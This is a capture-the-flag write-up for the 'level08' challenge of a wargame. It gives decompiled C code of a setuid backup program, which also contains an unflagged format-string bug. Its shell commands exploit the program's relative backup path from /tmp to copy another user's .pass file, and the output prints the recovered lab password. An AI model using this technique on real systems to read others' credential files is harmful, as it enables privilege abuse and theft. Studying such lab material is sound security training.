# Solution

Here is the decompile c code of the binary:

```c
void    log_wrapper(FILE *logfile, const char *prefix, const char *msg)
{
    char    buffer[264];

    strcpy(buffer, prefix);
    snprintf(&buffer[strlen(buffer)], 254 - strlen(buffer), msg);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(logfile, "LOG: %s\n", buffer);
}

int main(int argc, const char **argv, const char **envp)
{
  FILE *logfile; 
  FILE *stream; 
  int fd;
  char buf;
  char dest[104];

  buf = -1;
  if ( argc != 2 )
    printf("Usage: %s filename\n", *argv);
  logfile = fopen("./backups/.log", "w");
  if ( !logfile )
  {
    printf("ERROR: Failed to open %s\n", "./backups/.log");
    exit(1);
  }
  log_wrapper(logfile, "Starting back up: ", argv[1]);
  stream = fopen(argv[1], "r");
  if ( !stream )
  {
    printf("ERROR: Failed to open %s\n", argv[1]);
    exit(1);
  }
  strcpy(dest, "./backups/");
  strncat(dest, argv[1], 99 - strlen(dest));
  fd = open(dest, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
  if ( fd < 0 )
  {
    printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
    exit(1);
  }
  while ( 1 )
  {
    buf = fgetc(stream);
    if ( buf == -1 )
      break;
    write(fd, &buf, 1uLL);
  }
  log_wrapper(logfile, "Finished back up ", argv[1]);
  fclose(stream);
  close(fd);
  return 0;
}
```

So the program do a backup that will be stored inside the `./backups/` folder, the point of the exploit will be to make him write the flag for us inside that folder.

This is one is pretty simple we need to abuse the `./backups/.log` call in the main function because we cannot create a directory inside the home folder,
we need to create a new one inside the `/tmp` folder allowing us to control the backup folder, which from that will help us to leverage the possibility of getting the the .pass backup.

This is possible because path are relative not absoulute, also obviously the program is setuid and setguid.

```sh
level08@OverRide:~$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/
level08@OverRide:/tmp$ echo 'toto' > test
level08@OverRide:/tmp$ ~/level08 test
level08@OverRide:/tmp$ ls -laR backups/
backups/:
total 8
drwxrwxr-x 2 level08 level08 80 Oct  9 17:18 .
drwxrwxrwt 3 root    root    80 Oct  9 17:18 ..
-rw-rw-r-- 1 level09 users   55 Oct  9 17:18 .log
-rw-rw---- 1 level09 users    5 Oct  9 17:18 test
level08@OverRide:/tmp$ cat backups/test 
toto
```

So it works we have control of the backups file now lets try to open the .pass file

```sh
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We received this error which is because we need the same structure of the /home inside the backup folder so let's create it.

```sh
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

No error this time let's check if we have the .pass file store inside the backups folder.

```sh
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Yes it worked we have the flag and can procced to the next one.
